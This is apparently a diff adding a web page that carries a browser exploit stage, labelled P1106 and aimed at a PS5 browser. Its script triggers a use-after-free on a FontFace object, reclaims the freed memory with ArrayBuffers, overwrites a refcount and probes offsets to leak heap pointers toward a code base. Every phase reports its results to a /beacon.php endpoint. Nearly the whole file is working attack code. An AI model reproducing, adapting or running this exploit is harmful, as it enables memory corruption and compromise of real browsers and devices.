@@ -1,0 +1,270 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1106</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1106-BOOT','');
+log('phase','=== P1106: FONTFACE PROPERTY ORACLE ===');
+log('info','Goal: Read FF properties through UAF to map CSSFontFace layout');
+log('info','Then forge pointers to get code base leak');
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+// ============================================================
+// PHASE 1: Standard FontFace UAF + reclaim
+// ============================================================
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired=false,map1=null,buf=null,ptrs=null,idx=-1,patched=false;
+var jsFont=null; // The JS FontFace that wraps the freed CSSFontFace
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  jsFont=this; // SAVE reference to the JS FontFace wrapper
+  B('P1106-FIRE','gotJSFont=true');
+
+  if(st1){st1.remove();st1=null;}
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll for reclaim
+for(var t=10;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched){
+      patched=true;buf=b;idx=bi;
+      ptrs=[];
+      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs.push({off:q*8,val:b[q]});
+      // Patch refcount to keep alive
+      b[0]=0x100n;
+      B('P1106-UAF','buf='+bi+'|ms='+ms+'|'+ptrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+    }
+  }
+},ms);})(t);}
+
+// ============================================================
+// PHASE 2: Property oracle — read all FontFace properties
+// through the dangling JS wrapper AFTER UAF reclaim
+// ============================================================
+setTimeout(function(){
+  if(!patched||!jsFont){B('P1106-NOHIT','patched='+patched+'|jsFont='+(!!jsFont));return;}
+  B('P1106-S2','start property oracle');
+  log('phase','--- PHASE 2: Reading FontFace properties through UAF ---');
+
+  // Dump full initial buffer state (all 24 qwords)
+  var fullDump=[];
+  for(var q=0;q<buf.length;q++){
+    fullDump.push('+'+hex(q*8)+'='+hex(buf[q]));
+  }
+  B('P1106-DUMP',fullDump.join('|'));
+  log('info','Full 192B dump: '+fullDump.join(' '));
+
+  // Read every standard FontFace property
+  var props=['family','style','weight','display','unicodeRange',
+             'variant','featureSettings','variationSettings','status'];
+  var propResults=[];
+  for(var i=0;i<props.length;i++){
+    var name=props[i];
+    var val='???',err='';
+    try{
+      val=jsFont[name];
+      if(val===undefined)val='undefined';
+      else if(val===null)val='null';
+      else val=String(val).substring(0,100);
+    }catch(e){err=e.message||'exception';val='ERR:'+err;}
+    propResults.push(name+'='+val);
+    log(err?'fail':'ok',name+': '+val+(err?' ['+err+']':''));
+  }
+  B('P1106-PROPS',propResults.join('|'));
+
+  // Try .loaded (returns Promise)
+  var loadedResult='???';
+  try{
+    var p=jsFont.loaded;
+    loadedResult=typeof p==='object'?'Promise':''+p;
+  }catch(e){loadedResult='ERR:'+e.message;}
+  B('P1106-LOADED',loadedResult);
+  log('info','loaded: '+loadedResult);
+
+  // ============================================================
+  // PHASE 3: Write controlled values at each offset,
+  // then re-read properties to discover which offset
+  // controls which property
+  // ============================================================
+  log('phase','--- PHASE 3: Offset → Property mapping ---');
+
+  // Save original buffer state
+  var orig=[];
+  for(var q=0;q<buf.length;q++)orig.push(buf[q]);
+
+  // For each qword offset (skip 0 = refcount), write a marker
+  // and check which properties changed
+  var mapping=[];
+  for(var q=1;q<buf.length;q++){
+    var off=q*8;
+    // Write a unique non-zero marker
+    var marker=BigInt(0xAA00000000000000n | BigInt(q));
+    buf[q]=marker;
+
+    // Read properties — see which ones changed
+    var changes=[];
+    for(var i=0;i<props.length;i++){
+      var name=props[i];
+      try{
+        var val=jsFont[name];
+        var valStr=(val===undefined)?'undefined':(val===null)?'null':String(val).substring(0,60);
+        // Compare to initial read
+        if(valStr!==propResults[i].split('=').slice(1).join('=')){
+          changes.push(name+'='+valStr);
+        }
+      }catch(e){
+        changes.push(name+'=ERR:'+e.message);
+      }
+    }
+
+    // Restore original value
+    buf[q]=orig[q];
+
+    if(changes.length>0){
+      mapping.push('+'+hex(off)+':'+changes.join(','));
+      log('win','+'+hex(off)+' → '+changes.join(', '));
+    }
+  }
+
+  if(mapping.length>0){
+    B('P1106-MAP',mapping.join('|'));
+  }else{
+    B('P1106-MAP','none');
+    log('warn','No property responded to any offset write');
+  }
+
+  // ============================================================
+  // PHASE 4: Check if ANY property returns a ptr-like value
+  // Some properties might expose internal pointers as strings
+  // ============================================================
+  log('phase','--- PHASE 4: Pointer-shaped property values ---');
+
+  var allOwnProps=[];
+  try{
+    var descriptors=Object.getOwnPropertyNames(Object.getPrototypeOf(jsFont));
+    for(var i=0;i<descriptors.length;i++){
+      allOwnProps.push(descriptors[i]);
+    }
+  }catch(e){}
+
+  var ptrFinds=[];
+  for(var i=0;i<allOwnProps.length;i++){
+    var name=allOwnProps[i];
+    try{
+      var val=jsFont[name];
+      if(typeof val==='number'&&val>0x100000000){
+        ptrFinds.push(name+'='+hex(val));
+      }else if(typeof val==='bigint'&&val>0x100000000n){
+        ptrFinds.push(name+'='+hex(val));
+      }else if(typeof val==='string'&&val.length>0){
+        // Check if string looks like it contains pointer bytes
+        var hasHighByte=false;
+        for(var j=0;j<Math.min(val.length,20);j++){
+          if(val.charCodeAt(j)>0x7F)hasHighByte=true;
+        }
+        if(hasHighByte)ptrFinds.push(name+'=highbytes:len='+val.length);
+      }
+    }catch(e){}
+  }
+
+  if(ptrFinds.length>0){
+    B('P1106-PTRPROPS',ptrFinds.join('|'));
+    log('win','Pointer-shaped values: '+ptrFinds.join(', '));
+  }else{
+    B('P1106-PTRPROPS','none');
+    log('info','No pointer-shaped property values found');
+  }
+
+  // ============================================================
+  // PHASE 5: Try toString/valueOf on the FontFace
+  // Some objects leak their address via toString()
+  // ============================================================
+  log('phase','--- PHASE 5: toString / Symbol.toPrimitive ---');
+  var toStrResult='???';
+  try{toStrResult=jsFont.toString().substring(0,100);}catch(e){toStrResult='ERR:'+e.message;}
+  B('P1106-TOSTR',toStrResult);
+  log('info','toString: '+toStrResult);
+
+  var valueOfResult='???';
+  try{valueOfResult=String(jsFont.valueOf()).substring(0,100);}catch(e){valueOfResult='ERR:'+e.message;}
+  log('info','valueOf: '+valueOfResult);
+
+  // ============================================================
+  // PHASE 6: Try CSS-side reads — getComputedStyle might
+  // reveal font data that includes internal addresses
+  // ============================================================
+  log('phase','--- PHASE 6: CSS computed font data ---');
+  var el=document.createElement('span');
+  el.style.fontFamily='f0, s0';
+  el.textContent='Test';
+  document.body.appendChild(el);
+  var cs=getComputedStyle(el);
+  var cssProps=['fontFamily','fontStyle','fontWeight','fontVariant',
+                'fontFeatureSettings','fontVariationSettings','fontSize'];
+  var cssResults=[];
+  for(var i=0;i<cssProps.length;i++){
+    try{
+      var v=cs[cssProps[i]];
+      cssResults.push(cssProps[i]+'='+String(v).substring(0,60));
+    }catch(e){cssResults.push(cssProps[i]+'=ERR');}
+  }
+  B('P1106-CSS',cssResults.join('|'));
+  log('info','CSS: '+cssResults.join(', '));
+  el.remove();
+
+  // ============================================================
+  // PHASE 7: Heap pointer analysis — can we derive code base?
+  // Check if the heap ptrs have a consistent offset to code
+  // by looking at the ptr values themselves
+  // ============================================================
+  log('phase','--- PHASE 7: Heap pointer analysis ---');
+  var ptr58=0n,ptr68=0n;
+  for(var i=0;i<ptrs.length;i++){
+    if(ptrs[i].off===0x58)ptr58=ptrs[i].val;
+    if(ptrs[i].off===0x68)ptr68=ptrs[i].val;
+  }
+  // Delta between the two pointers
+  var delta=ptr68>ptr58?ptr68-ptr58:ptr58-ptr68;
+  var sign=ptr68>ptr58?'+':'-';
+  B('P1106-PTRS','p58='+hex(ptr58)+'|p68='+hex(ptr68)+'|delta='+sign+hex(delta));
+  log('ptr','ptr58='+hex(ptr58)+' ptr68='+hex(ptr68)+' delta='+sign+hex(delta));
+
+  // Check if either pointer's page-aligned base might be near code
+  // PS5 pages are 16KB = 0x4000
+  var base58=(ptr58>>14n)<<14n;
+  var base68=(ptr68>>14n)<<14n;
+  B('P1106-BASES','b58='+hex(base58)+'|b68='+hex(base68));
+
+  B('P1106-DONE','phases=7');
+  log('phase','=== P1106 COMPLETE ===');
+},500);
+</script>
+</body></html>
